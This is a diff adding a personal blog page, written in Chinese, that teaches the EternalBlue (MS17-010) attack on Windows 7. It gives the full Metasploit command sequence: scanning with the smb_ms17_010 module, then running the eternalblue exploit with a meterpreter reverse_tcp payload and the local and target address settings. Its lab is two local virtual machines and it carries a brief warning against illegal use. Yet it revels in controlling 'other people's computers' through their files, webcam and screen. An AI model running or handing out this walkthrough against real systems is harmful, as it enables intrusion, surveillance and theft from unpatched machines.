@@ -1,0 +1,166 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="UTF-8">
+  <meta name="Generator" content="EditPlus®">
+  <meta name="Author" content="">
+  <meta name="Keywords" content="">
+  <meta name="Description" content="">
+  <title>成宝博文-黑客入侵之-ms17-010漏洞</title>
+    <!--引入基础库-->
+    <meta name='viewport' content='width=device-width,minimum-scale=1.0 maximum-scale=1.0 user-scalable=no' /> 
+ <!-- bootstrap基础文件 -->
+<link href="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css" rel="stylesheet">
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/3.4.1/js/bootstrap.min.js"></script>
+   <!-- 结束 -->
+   <!-- 图片懒加载库 -->
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+  <script src="../js/publicjs.js"></script><!-- 公共js代码 -->
+  <link href="../css/publiccss.css" rel="stylesheet"><!-- 公共css代码 -->
+  <!-- 妹子框架 -->
+   <!-- <script src="https://cdn.bootcdn.net/ajax/libs/amazeui/2.7.2/css/amazeui.min.css"></script>  -->
+  <!-- 结束 -->
+  <style>
+    	/*在超小屏幕下 手机 小于768px布局容器的宽度为100%*/
+	@media screen and (max-width: 767px){
+	        /*.img{width:100%;}*/
+	    }
+    /*小屏幕 平板电脑 大于等于768px 布局容器改为750px*/
+    	@media screen and (min-width: 768px){
+	      .lazy{height:500px;height:500px;} 
+	    }
+   /*中等屏幕 992px 布局容器改为970px*/
+       	@media screen and (min-width: 992px){
+	      .lazy{height:500px;height:500px;} 
+	    }
+       /*大屏幕 大于1200px 布局容器改为1170px*/
+	    @media screen and (min-width: 992px){
+	     .lazy{height:500px;height:500px}   .
+	  }
+	  .ps{
+			width:89vw;
+			/* height:8vh;*/
+			color:rgb(176, 109, 51);
+			padding:19px;
+			margin-bottom:19px;
+			background-color:#cccccc;
+			 border-left: 5px solid #ffcc99;/*主要属性*/
+			}
+			p{font-size:16px;}
+  </style>
+ </head>
+ <body>
+        <!-- 顶部移动端PC端适配菜单栏 -->
+<nav class="navbar navbar-default" role="navigation">
+    <div class="container-fluid"> 
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse"
+                data-target="#example-navbar-collapse">
+            <span class="sr-only">切换导航</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="#">成宝个人网站</a>
+    </div>
+    <div class="collapse navbar-collapse" id="example-navbar-collapse">
+        <ul class="nav navbar-nav">
+            <li class="active"><a href="../index.html">首页</a></li>
+        </ul>
+    </div>
+    </div>
+</nav>
+ <!-- 菜单结束 -->
+ <!-- 选择主题 -->
+<div class="style-btn">
+<h4>选择主题</h4>
+<button type="button" class="btn btn-default de-style" onclick="green()">护眼绿</button>
+<button type="button" class="btn btn-default dark-style" onclick="dark()">暗黑模式</button>
+</div>
+<!-- 结束 -->
+<!-- 面包屑导航 -->
+<ul class="breadcrumb">
+    <li><a href="#">首页</a></li>
+    <li><a href="#">黑客教程</a></li>
+    <li class="active">永恒之蓝漏洞</li>
+</ul>
+<!-- 面包屑提示结束 -->
+<!-- 正文 -->
+     <div class="container">
+	              <h1>Windows系统的ms17-010漏洞</h1>
+				  <!-- <img class="lazy" data-original="https://img.52z.com/upload/news/image/20200421/20200421121630_33367.jpg">  -->
+				   <!-- 带左侧边框的 -->
+					  <div class="ps">
+					  <h3>准备工具</h3>
+				<p>两台电脑(这里使用虚拟机来测试)</p>
+				  <p>攻击机器kali IP 192.168.0.107</p>
+                  <p>靶机Windows7 64位 IP 192.168.0.109</p>
+					  </div>
+
+<h3>永恒之蓝ms17-010简介</h3>
+<p style="text-indent:20px">永恒之蓝是windows的一个高危漏洞影响了windows所有版本(最新的windows 10已经修复了)这个是一个远程代码执行漏洞可以在不碰别人电脑的情况下通过这个漏洞来入侵别人电脑 只要你和别人同局域网并且别人电脑可以上网就能入侵</p>
+<p>如果你的电脑不是最新的windows 10系统没有打补丁或者没有关闭了445端口那么你电脑就GG了</>p
+<p>这个漏洞是由NSA(美国国家安全局)的黑客组织泄露出去的漏洞</p>
+<p style="text-indent:20px">还记得2017年的5月12日利用永恒之蓝传播的勒索病毒WannaCry???当时这个病毒就卷席了全球导致中国高校校园网成为了勒索病毒的重灾区 很多学生的文档被加密不能恢复还对各个行业进行了严重的影响</p>
+<h2><a href="">为什么中国校园网成为了重灾区?</a></h2>
+<p style="text-indent:20px">不推荐大家使用校园网 校园网由于需要各种共享 把445 135 139 3389这些可以被黑客利用的端口都打开了 由于校园网也是个巨大的局域网所以连接校园网有很大几率电脑会中毒 大量的端口暴露在公网和内网 不安全</p>
+<h2>入侵过程(非法事情请勿利用)由于测试环境在本地没有特大危害</h2>
+<div class="panel panel-success">
+    <div class="panel-heading">
+        <h3 class="panel-title">前提准备</h3>
+    </div>
+    <div class="panel-body">
+  两个电脑在同一局域网内并且可以互相ping通 靶机和黑客机需要配置正确的IP地址
+    </div>
+	</div>
+<h3>先扫描靶机是否带有漏洞 全程利用Metasploit(俗称可以黑掉全宇宙的黑客入侵工具)进行攻击</h3>
+	<h4>使用auxiliary的扫描模块进行漏洞扫描</h4>
+	<img class="lazy" data-original="img/ms17.webp">
+	<a class = "look" href="img/ms17.webp">查看高清大图</a>
+	   <h4>搜索search ms17</h4>
+	<h4><span style="color:red">use auxiliary/scanner/smb/smb_ms17_010</span>的use是使用的意思</h4>
+	<h4><span style="color:red">set rhosts IP地址</span>这里设置目标靶机的IP地址</h4>
+    <h4><span style="color:red">然后输入run进行扫描</span>出现-Host is likely VULNERABLE to MS17-010说明靶机有这个漏洞</h4>
+		<img class="lazy" data-original="img/gj.webp">
+	<a class = "look" href="img/gj.webp">查看高清大图</a>
+	<h4>发现漏洞就可以下一步攻击 输入攻击命令</h4>
+	<h4>使用exploit攻击模块 然后使用</h4>
+     <h4>搜索search ms17</h4>
+	 <h4><span style="color:red">use exploit/windows/smb/ms17-010_eternalblue</span>使用攻击模块</h4>
+	 <h4><span style="color:red">set rhosts IP地址</span>这里设置目标靶机的IP地址</h4>
+	 <h4><span style="color:red">set payload windows/x64/meterpreter/reverse_tcp</span>设置攻击负荷</h4>
+	 <h4><span style="color:red">set lhost IP地址</span>这里设置本地的IP地址</h4>
+	 <h4><span style="color:red">输入run开始攻击</span>发现入侵成功</h4>
+	<img class="lazy" data-original="img/meterpreter.webp">
+	<a class = "look" href="img/meterpreter.webp">查看高清大图</a>
+	<h2>现在你可以操控别人电脑了哈哈哈完成入侵</h2>
+	<h3>截屏一下看看目标主机在干什么</h3>
+	<img class="lazy" data-original="img/rw.webp">
+	<a class = "look" href="img/rw.webp">查看高清大图</a>
+	<h3>你可以干很多事情这里不一一演示例如</h3>
+	<h3>控制别人的文件系统 控制别人电脑(例如控制别人电脑重启 关机 注销各种操作) 可以查看别人电脑摄像头 上传 下载文件</h3>
+	<div class="panel panel-danger">
+    <div class="panel-heading">
+        <h3 class="panel-title">提示事项</h3>
+    </div>
+    <div class="panel-body">
+  这个工具只能入侵Windows 7 64位的操作系统 如果是 Windows 7 32或者以下用这个工具攻击会导致目标主机蓝屏
+    </div>
+   <!-- 正文结束 -->
+	 <!-- ----------------底部面板------------------------ -->
+ <div class="panel panel-success">
+    <div class="panel-heading">
+        <h3 class="panel-title">温馨提示</h3>
+    </div>
+    <div class="panel-body">
+         <p>欢迎收藏哦</p>
+		<strong>如有问题请联系作者微信:<span style="color:red;">HA2765441358</span></strong>
+    </div>
+</div>
+<!-------------- 面板结束--------------------------- -->
+ </body>
+ <script>
+	
+ </script>
+</html>
